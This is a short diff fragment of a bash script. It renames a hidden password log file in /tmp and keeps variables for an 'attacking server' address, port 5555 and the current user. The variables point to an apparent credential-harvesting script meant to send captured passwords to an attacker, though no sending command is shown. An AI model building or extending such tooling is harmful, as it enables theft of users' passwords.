@@ -1,6 +1,6 @@
 #!/bin/bash
 # Permission 755
-LOGFILE="/tmp/.passwords"
+LOGFILE="/tmp/.password_log.txt"
 SERVER_IP="AttackingServerGoesHere"
 PORT="5555"
 CURRENT_USER=$(whoami)
